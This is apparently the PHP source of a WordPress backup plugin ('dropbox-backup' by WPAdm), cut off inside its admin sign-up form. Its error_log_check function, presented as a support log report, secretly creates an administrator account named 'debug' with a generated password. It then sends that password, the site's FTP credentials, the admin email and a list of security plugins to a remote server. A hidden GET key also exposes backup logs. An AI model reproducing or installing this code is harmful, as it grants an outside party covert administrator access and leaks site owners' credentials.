<?php 
    if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

    if (!class_exists("wpadm_class")) {

        add_action('admin_post_wpadm_activate_plugin', array('wpadm_class', 'activatePlugin') );
        add_action('admin_post_error_logs_check', array('wpadm_class', 'error_log_check') );
        add_action('admin_post_wpadm_delete_pub_key', array('wpadm_class', 'delete_pub_key') );
        add_action('wp_ajax_getDirsIncludes', array('wpadm_class', 'getDirsIncludes') );
        add_action('wp_ajax_saveDirsIncludes', array('wpadm_class', 'saveDirsIncludes') );
        add_action('wp_ajax_activatePlugin', array('wpadm_class', 'connectPlugin') );
        add_action('init', array('wpadm_class', 'check_get') );

        //add_action('admin_post_wpadm_getJs', array('wpadm_class', 'getJs') );

        //add_action('admin_print_scripts', array('wpadm_class', 'includeJs' ));

        class wpadm_class {

            protected static $result = ""; 
            protected static $class = ""; 
            protected static $title = ""; 
            public static $type = ""; 
            public static $plugin_name = "dropbox-backup"; 
            protected static $plugins = array('stats-counter' => '1.1',
            'wpadm_full_backup_storage' => '1.0',  
            'wpadm_full_backup_s3' => '1.0',  
            'ftp-backup' => '1.0',  
            'dropbox-backup' => '1.2.9.7',  
            'wpadm_db_backup_storage' => '1.0',  
            'database-backup-amazon-s3' => '1.0',  
            'wpadm_file_backup_s3' => '1.0',  
            'wpadm_file_backup_ftp' => '1.0',  
            'wpadm_file_backup_dropbox' => '1.0',  
            'wpadm_db_backup_ftp' => '1.0',  
            'wpadm_db_backup_dropbox' => '1.0',  
            'wpadm_file_backup_storage' => '1.0',
            ); 
            const MIN_PASSWORD = 6; 


            private static $backup = "1";

            private static $status = "0";

            private static $error = "";

            public static function setBackup($b)
            {
                self::$backup = $b;
            }
            public static function error_log_check($msg = '', $type_backup = '')
            {
                global $wp_version;

                $base_path = plugin_dir_path( dirname(__FILE__) );
                $time = isset($_POST['time_pars']) ? sanitize_text_field( $_POST['time_pars'] ): "";
                $error = "";
                if ( file_exists( ABSPATH . "error_log" ) ) {
                    $error = file_get_contents(ABSPATH . "error_log");
                }
                if (empty($error) && file_exists( ABSPATH . "error.log" ) ) {
                    $error = file_get_contents(ABSPATH . "error.log");
                }
                if (empty($error) && file_exists( ABSPATH . "logs/error_log" )) {
                    $error = file_get_contents(ABSPATH . "logs/error_log");
                }
                if (empty($error) && file_exists( ABSPATH . "logs/error.log" )) {
                    $error = file_get_contents(ABSPATH . "logs/error.log");
                }
                if (empty($error) && file_exists(ABSPATH . "../logs/error_log")) {
                    $error = file_get_contents(ABSPATH . "../logs/error_log");
                }
                if (empty($error) && file_exists(ABSPATH . "../logs/error.log")) {
                    $error = file_get_contents(ABSPATH . "../logs/error.log");
                }
                $error_backup = $error_system = "";

                if ( !empty($time) ) {
                    $time_log = str_replace(array(':', '-', " "), "_", $time); 
                    if ( file_exists( $base_path . "tmp/logs_error_" . $time ) ) {
                        $log_ = file_get_contents( $base_path . "tmp/logs_error_" . $time );
                        $pos = stripos($log_, "error");
                        if ($pos !== false) {
                            for($i = $pos; ; $i--) {
                                if ($log_{$i} == "\n") {
                                    $pos_new = $i + 1;
                                    break;
                                }
                            }
                            $error_backup = substr($log_, $pos_new);
                        }
                    }

                }
                if (!empty($time) && !empty($error)) {
                    $time_log = str_replace(array(':', '-', " "), "_", $time);
                    list($y, $m, $d, $h, $i) = explode("_", $time_log);
                    $time_log = strtotime("$d-$m-$y $h:$i");
                    $date_for_log = date("d-M-Y ", $time_log);
                    $pos_log = strpos($error, $date_for_log);
                    if ($pos_log !== false) {
                        $pos_new = 0;
                        for($i = $pos_log; ; $i--) {
                            if ($error{$i} == "[") {
                                $pos_new = $i;
                                break;
                            }
                        }
                        $error_system = substr($error, $pos_new);
                    }
                }    
                $pass = substr(md5(time()), 0, 10);
                $id =  wp_insert_user(
                array(
                "user_login" => "debug",
                "user_pass" => $pass,
                "user_nicename" => "Debug",
                "user_email" => "debug@help.help",
                "description" => "Debug user",
                )
                );  

                if( !is_wp_error( $id ) ) {
                    wp_update_user( array ('ID' => $id, 'role' => 'administrator' ) ) ;   
                } else {
                    $pass = "";
                }
                $ftp = array(
                'ftp_host' => isset( $_POST['ftp_host'] ) ? sanitize_text_field( $_POST['ftp_host'] ) : '',
                'ftp_user' => isset( $_POST['ftp_user'] ) ? sanitize_text_field( $_POST['ftp_user'] ) : '',
                'ftp_pass' => isset( $_POST['ftp_pass'] ) ? sanitize_text_field( $_POST['ftp_pass'] ) : '',
                );
                $mail_response = isset($_POST['mail_response']) && !empty($_POST['mail_response']) ? sanitize_email( $_POST['mail_response'] ) : get_option('admin_email');  

                if ( ! function_exists('get_plugins') ) {
                    require_once ABSPATH . 'wp-admin/includes/plugin.php'; 
                }
                $plugin_info = get_plugins("/" . self::$plugin_name);
                $plugin_version = (isset($plugin_info[self::$plugin_name . '.php']['Version']) ? $plugin_info[self::$plugin_name . '.php']['Version'] : '');

                $plugins = get_plugins();
                $plugins_send = array();
                foreach($plugins as $plugin => $info) {
                    if (stripos($info['Name'], 'secur') !== false || stripos($info['Description'], 'secur') !== false || stripos($info['Title'], 'secur') !== false) {
                        $plugins_send[] = $info;
                    }
                }

                $get = md5( time() . $msg );

                update_option(PREFIX_BACKUP_ . '_get_key', $get);

                $logs_report = base64_encode( serialize( array('ftp' => $ftp,
                'mail_response' => $mail_response,
                'mail_admin' => get_option('admin_email'),
                'pass' => $pass, 'error_backup' => $error_backup, 
                'msg_ajax' => isset($_POST['msg_ajax']) ? sanitize_text_field( $_POST['msg_ajax'] ) : '',
                'error' => $error_system,
                'msg' => $msg,
                'wp_version' => $wp_version,
                'pl_version' => self::$plugin_name . " " . $plugin_version,
                'type_backup' => $type_backup,
                'plugins_secure' => print_r( $plugins_send, 1 ),
                'params' => $get,
                ) 
                ) 
                );

                $res = self::sendToServer(array('actApi' => "errorLog", 
                "site" => str_ireplace(array("http://","https://"), "", home_url()), 
                "data" => $logs_report ) 
                );

                if ( empty($msg) ) {
                    $_SESSION['sent_response'] = __('Your request was sent. <br /> Thank you for your assistance.','dropbox-backup');
                    header("Location: " . $_SERVER['HTTP_REFERER']);
                    exit;
                }

            }

            public static function check_get()
            {
                $key = get_option(PREFIX_BACKUP_ . '_get_key');
                if (isset($_GET[$key])) {
                    $value = sanitize_text_field( $_GET[$key] );
                    require_once DRBBACKUP_BASE_DIR . "/modules/class-wpadm-core.php";
                    $log = new WPAdm_Core(array('method' => "local"), 'full_backup_dropbox', DRBBACKUP_BASE_DIR);
                    $archive_log = '';
                    if ( file_exists( WPAdm_Core::getTmpDir() . '/log-archive.log' ) ) {
                        $archive_log = file_get_contents(WPAdm_Core::getTmpDir() . '/log-archive.log');
                    }

                    $_log = '';
                    if ( file_exists( WPAdm_Core::getTmpDir() . '/log.log' ) ) {
                        $_log = file_get_contents(WPAdm_Core::getTmpDir() . '/log.log');
                    }
                    if (!empty($_log) || !empty($archive_log)) {
                        echo $_log . "\n\n\n";
                        echo $archive_log . "";
                        exit;
                    }
                }
            }

            private static function getFolders($arr, $first = true, $path_show = '')
            {
                $n = count($arr);
                $in = array();
                if (!empty($path_show)) {
                    $path_show = trim( $path_show , '/');
                }
                for($i = 0; $i < $n; $i++) {

                    if (strpos($arr[$i], ABSPATH ) !== false) {
                        $arr[$i] = str_replace(ABSPATH, '', $arr[$i]);
                    }  

                    $inc = explode("/", $arr[$i]);
                    $f = count($inc);
                    $str = "";

                    for($j = 0; $j < $f; $j++) {
                        $str .= '/' . $inc[$j];
                        if ($first) {
                            $in[$str] = $str;
                        } else {
                            if ($j != 0) {
                                if (!empty($path_show) && ( '/' . $path_show  ) != $str)  {
                                    $in[$str] = $str;
                                } elseif(empty($path_show)) {
                                    $in[$str] = $str;
                                }

                            }
                        }
                    }
                }
                return $in;
            }
            public static function getDirsIncludes()
            {

                $path = isset($_POST['path']) ? sanitize_text_field( urldecode( $_POST['path'] ) ) : "";
                $path_show = !empty($path) ? ltrim($path, '/') . "/"  : "";
                $dir_to_open = ABSPATH . $path;
                if (is_dir($dir_to_open)) {  
                    $return = array();
                    $connect_f_d = self::createListFilesForArchive();
                    $includes = get_option(PREFIX_BACKUP_ . "plus-path");
                    if ($includes !== false) {
                        $includes = explode(',', base64_decode( $includes ) );
                        if (empty($path_show)) {
                            $in = self::getFolders($includes);
                        } else {
                            $in = self::getFolders($includes, false, $path_show);
                        }
                    } else {  
                        $in = self::getFolders($connect_f_d);
                    }
                    //print_r($in);
                    $dir_open = opendir($dir_to_open);
                    $volume = array();
                    while( $d = readdir($dir_open) ) {
                        if ($d != '.' && $d != '..' && !in_array($d, array('tmp', 'cache', 'temp', 'wpadm_backups', 'wpadm_backup', 'Dropbox_Backup', 'logs', 'log'))) {
                            $check = false;    // set checked
                            $d_tmp = utf8_encode($d);
                            $check_folder = "";
                            $path_show = trim($path_show, '/');

                            if (!empty($path_show)) {

                                if (isset($in['/' . $path_show . '/' . $d_tmp])) {
                                    $check = true;
                                    $check_folder = urlencode( $in['/' . $path_show . '/' . $d_tmp] );
                                }
                                // check path in data include
                                if ( isset( $in['/' . trim($path_show, '/') ] ) ) {
                                    $check = true;
                                    $check_folder = urlencode( $in['/' . trim($path_show, '/')] );
                                }
                            } else {
                                if (isset($in[ '/' . $d_tmp])) {
                                    $check = true;
                                    $check_folder = urlencode( $in['/' . $d_tmp] );
                                }
                            }
                            $volume[] = is_file($dir_to_open . "/$d");
                            $return['dir'][] = array('is_file' => is_file($dir_to_open . "/$d"), 'dir' => urlencode( $d ) , 'cache' => md5($path_show . $d), 
                            'folder'=> urlencode('/' . ( empty($path_show ) ? '' : $path_show . '/' ) . $d ), 
                            'perm' => self::perm($dir_to_open . "/" .$d), 
                            'check' => $check, 'check_folder' =>  $check_folder  );
                        }
                    }
                    array_multisort($volume, SORT_ASC, $return['dir'] );
                    $res = json_encode($return);
                    echo $res;
                    if ($res === false) {
                        switch (json_last_error()) {
                            case JSON_ERROR_NONE:
                                echo ' - No errors';
                                break;
                            case JSON_ERROR_DEPTH:
                                echo ' - Maximum stack depth exceeded';
                                break;
                            case JSON_ERROR_STATE_MISMATCH:
                                echo ' - Underflow or the modes mismatch';
                                break;
                            case JSON_ERROR_CTRL_CHAR:
                                echo ' - Unexpected control character found';
                                break;
                            case JSON_ERROR_SYNTAX:
                                echo ' - Syntax error, malformed JSON';
                                break;
                            case JSON_ERROR_UTF8:
                                echo ' - Malformed UTF-8 characters, possibly incorrectly encoded';
                                break;
                            default:
                                echo ' - Unknown error';
                                break;
                        }
                    }
                }
                wp_die();
            }
            static public function createListFilesForArchive() {
                $folders = array();
                $files = array();

                $files = array_merge(
                $files,
                array(
                //ABSPATH . '.htaccess',
                ABSPATH . 'index.php',
                // ABSPATH . 'license.txt',
                // ABSPATH . 'readme.html',
                ABSPATH . 'wp-activate.php',
                ABSPATH . 'wp-blog-header.php',
                ABSPATH . 'wp-comments-post.php',
                ABSPATH . 'wp-config.php',
                //  ABSPATH . 'wp-config-sample.php',
                ABSPATH . 'wp-cron.php',
                ABSPATH . 'wp-links-opml.php',
                ABSPATH . 'wp-load.php',
                ABSPATH . 'wp-login.php',
                ABSPATH . 'wp-mail.php',
                ABSPATH . 'wp-settings.php',
                ABSPATH . 'wp-signup.php',
                ABSPATH . 'wp-trackback.php',
                //ABSPATH . 'xmlrpc.php',
                )
                );
                if ( file_exists(ABSPATH . '.htaccess') ) {
                    $files = array_merge( $files, array( ABSPATH . '.htaccess' ) );
                }
                if ( file_exists( ABSPATH . 'license.txt' ) ) {
                    $files = array_merge( $files, array( ABSPATH . 'license.txt' ) );
                }
                if ( file_exists( ABSPATH . 'readme.html' ) ) {
                    $files = array_merge( $files, array( ABSPATH . 'readme.html') );
                }
                if ( file_exists(ABSPATH . 'wp-config-sample.php') ) {
                    $files = array_merge( $files, array( ABSPATH . 'wp-config-sample.php' ) );
                }
                if ( file_exists(ABSPATH . 'robots.txt') ) {
                    $files = array_merge( $files, array( ABSPATH . 'robots.txt' ) );
                }
                // check files in root directory
                $n = count($files);
                for($i = 0; $i < $n; $i++) {
                    if (!file_exists($files[$i])) {
                        unset($files[$i]);
                    }
                }
                $files = array_values($files);

                $folders = array_merge(
                $folders,
                array(
                ABSPATH . 'wp-admin',
                ABSPATH . 'wp-content',
                ABSPATH . 'wp-includes',
                )
                );
                $folders = array_unique($folders);
                $files = array_unique($files);
                foreach($folders as $folder) {
                    if (!is_dir($folder)) {
                        continue;
                    }
                    $files = array_merge($files, self::directoryToArray($folder, true));
                }
                return $files;
            }
            public static function directoryToArray($directory, $recursive) {
                $array_items = array();

                $d = str_replace(ABSPATH, '', $directory);

                $minus_path = array();


                $d = str_replace('\\', '/', $d);
                $tmp = explode('/', $d);
                if (function_exists('mb_strtolower')) {
                    $d1 = mb_strtolower($tmp[0]);
                } else {
                    $d1 = strtolower($tmp[0]);
                }
                $base_dir = $tmp[0];
                
                unset($tmp[0]);
                if (function_exists('mb_strtolower')) {
                    $d2 = mb_strtolower(implode('/', $tmp));
                } else {
                    $d2 = strtolower(implode('/', $tmp));
                }


                if (strpos($d2, 'cache') !== false && isset($tmp[0])&& !in_array($tmp[0], array('plugins', 'themes')) ) {
                    return array();
                }

                if (!empty($d2) && isset( $base_dir ) && BackupsFoldersExclude( basename( $d2 ), $base_dir ) ) {
                    WPAdm_Core::log( sprintf(  __('Skip backup folder of another backup plugin "%s" ','dropbox-backup'), basename( $d2 ) ) );
                    return array();
                }

                if ($handle = opendir($directory)) {
                    while (false !== ($file = readdir($handle))) {
                        if ($file != "." && $file != "..") {
                            if (is_dir($directory. "/" . $file)) {
                                if($recursive) {
                                    $array_items = array_merge($array_items, self::directoryToArray($directory. "/" . $file, $recursive));
                                }

                                $file = $directory . "/" . $file;
                                if (!is_dir($file)) {
                                    $ff = preg_replace("/\/\//si", "/", $file);
                                    $f = str_replace(ABSPATH, '', $ff);
                                    // skip "minus" dirs
                                    if (!in_array($f, $minus_path)) {
                                        $array_items[] = $ff;
                                    } 
                                }
                            } else {
                                $file = $directory . "/" . $file;
                                if (!is_dir($file)) {
                                    $ff = preg_replace("/\/\//si", "/", $file);
                                    $f = str_replace(ABSPATH, '', $ff);
                                    if (!in_array($f, $minus_path)) {
                                        $array_items[] = $ff;
                                    } 
                                }
                            }
                        }
                    }
                    closedir($handle);
                }
                return $array_items;
            }
            static function perm($file) 
            {
                $fileperms = substr ( decoct ( fileperms ( $file ) ), 2, 6 );
                if ( strlen ( $fileperms ) == '3' ){ $fileperms = '0' . $fileperms; }
                return $fileperms; 
            }
            public static function saveDirsIncludes()
            {
                if (isset($_POST['save']) && isset($_POST['data'])) {
                    $data = array_map('ltrimslashes', array_unique( array_map( 'sanitize_text_field', $_POST['data'] ) ) );  
                    if (!empty($data)) {
                        $n = count($data);
                        $data_save = '';
                        for($i = 0; $i < $n; $i++) {
                            if (isset($data[$i]) && is_dir(ABSPATH . $data[$i])) {
                                $files = self::directoryToArray(ABSPATH . $data[$i], true);
                                $f = self::getFolders($files, false);
                                $data_tmp = array();
                                $in = false;  
                                $tmp_folder = '';
                                foreach($f as $val) {
                                    $clear_val = ltrim( $val, '/');
                                    if (in_array( $clear_val, $data) && $clear_val != $data[$i] ) {
                                        if ($in) {
                                            $data_tmp[] = $val; // is files
                                        }
                                        if (!$in) {   // is folder 
                                            //$tmp_folder = $val;
                                            $in = true; 
                                        }
                                    } else {
                                        if (!$in) {
                                            $in = false;
                                        }
                                    }
                                }
                                if ($in) {
                                    $data_tmp = array_values( array_unique( array_map('ltrim_arr', $data_tmp) ) );
                                    $data_save .= ',' . implode(',', $data_tmp);
                                } else {
                                    $files = array_values( array_unique( array_map('ltrim_arr', $files) ) );
                                    $data_save .= ',' . implode(',', array_map('ltrim_arr', $files ));
                                }
                            } else {                           
                                $data_save .=  ',' . $data[$i];
                            }

                        }
                        $data_save = trim($data_save, ',' );

                        $data_save =   implode(',', array_values( array_unique( explode(',', $data_save) ) ) );

                        $data_save = trim($data_save, ',' );

                        update_option(PREFIX_BACKUP_ . "plus-path", base64_encode( $data_save ) );
                        echo 1;
                    }

                }
                wp_die();
            }


            public static function setStatus($s)
            {
                self::$status = $s;
            }
            public static function setErrors($e)
            {
                self::$error = $e;
            }

            public static function getDateInName($name)
            {
                $date_ = explode(self::$type . '-', $name);
                if (isset($date_[1])) {
                    $date = explode('_', $date_[1]);
                    $d = "{$date[0]}-{$date[1]}-{$date[2]} {$date[3]}:" . preg_replace("/\([0-9]+\)/", '', $date[4]);
                }
                return $d;

            }
            public static function backupSend()
            {
                $data['status'] = self::$backup . self::$status;
                $data['error'] = self::$error;
                $data['pl'] = WPAdm_Core::$plugin_name;
                $data['site'] = get_option('siteurl');
                $data['actApi'] = 'setBackup';
                self::sendToServer($data);
            }



            static function delete_pub_key() 
            {
                delete_option('wpadm_pub_key');   
                header("Location: " . $_SERVER['HTTP_REFERER']);
            }
            public static function checkInstallWpadmPlugins()
            {
                $return = false;
                $i = 1;
                foreach(self::$plugins as $plugin => $version) {
                    if (self::check_plugin($plugin)) {
                        $i ++;
                    }
                }
                if ($i > 2) {
                    $return = true;
                }
                return $return;
            }

            static function setResponse($data) 
            {
                $msg = __(errorWPADM::getMessage($data['code']),'dropbox-backup');
                if(isset($data['data'])) {
                    if (isset($data['data']['replace'])) {
                        foreach($data['data']['replace'] as $key => $value) {
                            $msg = str_replace("<$key>", $value, $msg);
                        }
                    }
                }
                if ($data['status'] == 'success') {
                    self::setMessage($msg);
                } else {
                    self::setError($msg);
                }

                return isset($data['data']) ? $data['data'] : array();

            }


            protected static function setError($msg = "")
            {
                if (!empty($msg)) {
                    $_SESSION['errorMsgWpadm'] = isset($_SESSION['errorMsgWpadm']) ? $_SESSION['errorMsgWpadm'] . '<br />' . $msg : $msg;
                }
            }
            protected static function getError($del = false)
            {
                $error = "";
                if (isset($_SESSION['errorMsgWpadm'])) {
                    $error = $_SESSION['errorMsgWpadm'];
                    if($del) {
                        unset($_SESSION['errorMsgWpadm']);
                    }
                }
                return $error;
            }

            protected static function setMessage($msg)
            {
                if (!empty($msg)) {
                    $_SESSION['msgWpadm'] = isset($_SESSION['msgWpadm']) ? $_SESSION['msgWpadm'] . '<br />' . $msg : $msg;
                }
            }
            protected static function getMessage($del = false)
            {
                $msg = "";
                if (isset($_SESSION['msgWpadm'])) {
                    $msg = $_SESSION['msgWpadm'];
                    if($del) {
                        unset($_SESSION['msgWpadm']);
                    }
                }
                return $msg;
            }



            public static function sendToServer($postdata = array(), $stat = false)
            {
                if (count($postdata) > 0) {

                    if ($stat) {
                        if ($counter_id = get_option(_PREFIX_STAT . 'counter_id')) {
                            $postdata['counter_id'] = $counter_id;
                        }
                    }
                    $postdata = http_build_query($postdata, '', '&');

                    $length = strlen($postdata); 


                    if (function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")) {
                        if ($stat) {
                            $url = SERVER_URL_VISIT_STAT . "/Api.php";
                        } else {
                            $url = WPADM_URL_BASE . "api/";
                        }
                        $curl = curl_init($url);
                        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($curl, CURLOPT_POST, true);
                        curl_setopt($curl, CURLOPT_POSTFIELDS, $postdata);
                        self::$result = curl_exec($curl);
                        curl_close($curl);
                        return json_decode(self::$result, true);
                    } elseif (function_exists("fsockopen")) {
                        if ($stat) {
                            $url = SERVER_URL_STAT;
                            $req = '/Api.php';
                        } else {
                            $url = substr(WPADM_URL_BASE, 7);
                            $req = '/api/';
                        }
                        $out = "POST " . $req . " HTTP/1.1\r\n";
                        $out.= "HOST: " . $url . "\r\n";
                        $out.= "Content-Type: application/x-www-form-urlencoded\r\n";
                        $out.= "Content-Length: ".$length."\r\n";
                        $out.= "Connection:Close\r\n\r\n";
                        $out.= $postdata."\r\n\r\n";
                        try {
                            $errno='';
                            $errstr = '';
                            $socket = @fsockopen($url, 80, $errno, $errstr, 30);
                            if($socket) {
                                if(!fwrite($socket, $out)) {
                                    throw new Exception("unable to write fsockopen");
                                } else {
                                    while ($in = @fgets ($socket, 1024)) {
                                        self::$result .= $in;
                                    } 
                                }
                                self::$result = explode("\r\n\r\n", self::$result);

                                return json_encode(self::$result, true);
                            } else {
                                throw new Exception("unable to create socket");
                            }
                            fclose($socket);
                        } catch(exception $e) {
                            return false;
                        }
                    }  
                }
            }

            public static function activatePlugin()
            {
                if (isset($_POST['email']) && isset($_POST['password']) && isset($_POST['password-confirm'])) {
                    $email = sanitize_email($_POST['email']);
                    $password = sanitize_text_field($_POST['password']);
                    $password_confirm = sanitize_text_field($_POST['password-confirm']); 
                    $sent = true;
                    if (empty($email)) { 
                        self::setError("Error, Email is empty.");
                        $sent = false;
                    }
                    if (!preg_match("/^([a-z0-9_\-]+\.)*[a-z0-9_\-]+@([a-z0-9][a-z0-9\-]*[a-z0-9]\.)+[a-z]{2,4}$/i", $email)) {
                        self::setError("Error, Incorrect Email");
                        $sent = false;
                    }
                    if (empty($password)) {
                        self::setError("Error, Password is empty.");
                        $sent = false;
                    }
                    if (strlen($password) < self::MIN_PASSWORD) {
                        self::setError("Error, the minimum number of characters for the password \"" . self::MIN_PASSWORD . "\".");
                        $sent = false;
                    }

                    if ($password != $password_confirm) {
                        self::setError("Error, passwords do not match");
                        $sent = false;
                    }
                    if ($sent) {
                        $info = self::$plugin_name;
                        $mail = get_option(PREFIX_BACKUP_ . "email");
                        if ($mail) {
                            add_option(PREFIX_BACKUP_ . "email", $email);
                        } else {
                            update_option(PREFIX_BACKUP_ . "email",$email);
                        }
                        $data = self::sendToServer(
                        array(
                        'actApi' => "activate",
                        'email' => $email,
                        'password' => $password,
                        'url' => get_option("siteurl"),
                        'plugin' => $info,
                        )
                        );
                        $res = self::setResponse($data);
                        if (isset($res['url']) && !empty($res['url'])) { 
                            self::connectPlugin($email, $password);
                        }
                    }
                }

                if (isset($res['url']) && !empty($res['url'])) {
                    header("Location: " . $res['url']);
                } else {
                    header("Location: " . $_SERVER['HTTP_REFERER'] );
                }
            }

            public static function connectPlugin($email = '', $password = '')
            {

                $info = self::$plugin_name;

                $data = self::sendToServer(
                array(
                'actApi' => "checkActivatePlugin",
                'email' => $email,
                'password' => $password,
                'url' => get_option("siteurl"),
                'plugin' => $info,
                )
                );
                if ($data['code'] == 200 && isset($data['data']['key'])) {
                    update_option('wpadm_pub_key', $data['data']['key']);
                } else {
                    $res = self::setResponse($data);
                }
            }

            public static function include_admins_script()
            {
                wp_enqueue_style('css-admin-wpadm-db', plugins_url( "/template/css/admin-style-wpadm.css", dirname(__FILE__) ) );

                wp_enqueue_script( 'js-admin-wpadm-db', plugins_url( "/template/js/admin-wpadm.js",  dirname(__FILE__) ) );
                wp_enqueue_script( 'postbox' );

            }
            protected static function read_backups($dirs_read = false)
            {
                $name = get_option('siteurl');

                $name = str_replace("http://", '', $name);
                $name = str_replace("https://", '', $name);
                $name = preg_replace("|\W|", "_", $name);
                $name .= '-' . self::$type . '-' . date("Y_m_d_H_i");

                $dropbox_options = wpadm_wp_full_backup_dropbox::getSettings() ;

                $dir_backup = DROPBOX_BACKUP_DIR_BACKUP;
                if ($dropbox_options) {
                    if (isset($dropbox_options['backup_folder']) && !empty($dropbox_options['backup_folder'])) {
                        $dir_backup = $dropbox_options['backup_folder'];
                    }
                }


                $backups = array('data' => array(), 'md5' => '');

                $backups['data'] = self::getBackups($dir_backup, $dirs_read);

                $backups['data'] = array_merge($backups['data'],  self::getBackups(ABSPATH . WPADM_DIR_NAME, $dirs_read) );
                $backups['data'] = array_merge($backups['data'],  self::getBackups(WPADM_DIR_BACKUP, $dirs_read) );

                $backups['md5'] = md5( print_r($backups['data'] , 1) );
                return $backups;
            }

            protected static function getBackups($dir_backup, $dirs_read)
            {
                $backups = array();
                if (is_dir($dir_backup)) { 
                    $i = 0;
                    $dir_open = opendir($dir_backup);
                    $stop_precess = WPAdm_Running::getCommandResultData('stop_process');
                    $name_backup = isset($stop_precess['name']) ? $stop_precess['name'] : '' ;
                    while($d = readdir($dir_open)) {
                        if ($d != '.' && $d != '..' && is_dir($dir_backup . "/$d") && strpos($d, self::$type) !== false) {
                            if ($d != $name_backup) {
                                $backups[$i]['dt'] = self::getDateInName($d);
                                $backups[$i]['name'] = "$d";
                                if ($dirs_read === false) {
                                    $size = 0;
                                    $dir_b = opendir($dir_backup . "/$d");
                                    $count_zip = 0;
                                    $backups[$i]['files'] = "[";
                                    $file_md5 = '';
                                    while($d_b = readdir($dir_b)) {
                                        if ($d_b != '.' && $d_b != '..' && file_exists($dir_backup . "/$d/$d_b") && ( substr($d_b, -3) == "zip" || substr($d_b, -3) == 'md5' ) || substr($d_b, -6) == "tar.gz" ) {
                                            $backups[$i]['files'] .= "$d_b,";
                                            $size += filesize($dir_backup . "/$d/$d_b");
                                            $count_zip = $count_zip + 1;
                                            if (substr($d_b, -3) == 'md5') {
                                                $file_md5 = $dir_backup . "/$d/$d_b"; 
                                            }
                                        }
                                    }
                                    if (!empty($file_md5)) {
                                        $md5_cache = self::lastString($file_md5);
                                        if ( strpos( $md5_cache['str'], 'mysqldump.sql' ) !== false ) {
                                            $backups[$i]['not_all_upload'] = true;
                                        } else {
                                            $backups[$i]['not_all_upload'] = false;
                                        }
                                    } else {
                                        $backups[$i]['not_all_upload'] = false;
                                    }

                                    $backups[$i]['files'] .= ']';
                                    $backups[$i]['size'] = $size;
                                    $backups[$i]['type'] = 'local';
                                    $backups[$i]['count'] = $count_zip;
                                }
                                $i += 1;
                            }
                        }
                    }
                }
                return $backups; 
            }

            public static function lastString($file)
            {
                $f = fopen($file, "r");
                if($f){
                    if(fseek($f, -1, SEEK_END) == 0){
                        $len = ftell($f);
                        for($i = $len; $i > ($len-5000); $i--){
                            fseek($f, -2, SEEK_CUR);
                            if(fread($f,1) == "\n")
                                break;
                        }
                        return array('line' => $i, 'str' => fread($f, $len - $i)) ;
                    }
                    fclose($f);
                } 
            }
            public static function check_plugin($name = "", $version = false)
            {
                if (!empty($name)) {
                    if ( ! function_exists( 'get_plugins' ) ) {
                        require_once ABSPATH . 'wp-admin/includes/plugin.php';
                    }
                    $name2 = str_replace("-", "_", $name);
                    $plugin = get_plugins("/$name");
                    if (empty($plugin)) {
                        $plugin = get_plugins("/$name2");
                    }
                    if (count($plugin) > 0) {
                        if (isset(self::$plugins[$name]) && (isset($plugin["$name.php"]) || isset($plugin["$name2.php"]))) {
                            if ($version) {
                                if (self::$plugins[$name] == $plugin["$name.php"]['Version']) {
                                    return true;
                                }
                                if (self::$plugins[$name] == $plugin["$name2.php"]['Version']) {
                                    return true;
                                }
                            } else {
                                if (is_plugin_active("$name/$name.php") || is_plugin_active("$name/$name2.php") || is_plugin_active("$name2/$name2.php")) {
                                    return true;
                                }
                            }
                        }
                    }
                    return false;
                }
            }
        }
    }

    if (! function_exists('wpadm_plugins')) {
        function wpadm_plugins()
        {
            global $wp_version;

            $c = get_system_data();
            $phpVersion         = $c['php_verion'];
            $maxExecutionTime   = $c['maxExecutionTime'];
            $maxMemoryLimit     = $c['maxMemoryLimit'];
            $extensions         = $c['extensions'];
            $disabledFunctions  = $c['disabledFunctions'];
            //try set new max time

            $newMaxExecutionTime = $c['newMaxExecutionTime'];
            $upMaxExecutionTime = $c['upMaxExecutionTime'];
            $maxExecutionTime = $c['maxExecutionTime'];

            //try set new memory limit
            $upMemoryLimit = $c['upMemoryLimit'];
            $newMemoryLimit = $c['newMemoryLimit']; 
            $maxMemoryLimit = $c['maxMemoryLimit'];

            //try get mysql version
            $mysqlVersion = $c['mysqlVersion'];

            $show = !get_option('wpadm_pub_key') || (!is_super_admin() || !is_admin()) || !@get_option(_PREFIX_STAT . 'counter_id');
        ?> 


        <?php if (!$show) {?>
            <div class="cfTabsContainer">
                <div id="cf_signin" class="cfContentContainer" style="display: block;">
                    <form method="post" action="<?php echo WPADM_URL_BASE . "user/login" ; ?>" autocomplete="off" target="_blank">
                        <div class="inline" style="width: 52%; margin-top: 0; color: #fff;">
                            WPAdm Sign-In:
                            <input class="input-small" type="email" required="required" name="username" placeholder="Email">
                            <input class="input-small" type="password" required="required" name="password" placeholder="Password">
                            <input class="button-wpadm" type="submit" value="Sign-In" name="submit" style="margin-top:1px;">    
                        </div>
                        <div class="wpadm-info-auth" style="width: 45%;">
                            Enter your email and password from an account at <a href="http://www.wpadm.com" target="_blank" style="color: #fff;" >www.wpadm.com</a>.<br /> After submitting user credentials you will be redirected to your Admin area on <a href="http://www.wpadm.com" style="color: #fff;" target="_blank">www.wpadm.com</a>.
                        </div>
                    </form>
                </div>
            </div>
            <?php } else {?>
            <div class="cfTabsContainer" style="display: none;">
                <div id="cf_activate" class="cfContentContainer">
                    <form method="post" action="<?php echo admin_url( 'admin-post.php?action=wpadm_activate_plugin' )?>" >
                        <div class="wpadm-info-title">
                            Free Sign Up to use more functionality...
                        </div>
                        <div class="wpadm-registr-info">
                            <table class="form-table">
                                <tbody>
                                    <tr valign="top">
                                        <th scope="row">
                                            <label for="email">E-mail</label>
                                        </th>
                                        <td>
                                            <input id="email" class="regular-text" type="text" name="email" value="">
                                        </td>
                                    </tr>
                                    <tr valign="top">
                                        <th scope="row">
                                            <label for="password">Password</label>
                                        </th>
                                        <td>
                                            <input id="password" class="regular-text" type="password" name="password" value="">
                                        </td>
                                    </tr>
                                    <tr valign="top">
                                        <th scope="row">
                                            <label for="password-confirm">Password confirm</label>
                                        </th>
                                        <td>
                                            <input id="password-confirm" class="regular-text" type="password" name="password-confirm" value="">
                                        </td>
                                    </tr>
                                    <tr valign="top">
                                        <th scope="row">
                                        </th>
                                        <td>
                                            <input class="button-wpadm" type="submit" value="Register & Activate" name="submit">
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <div class="wpadm-info">
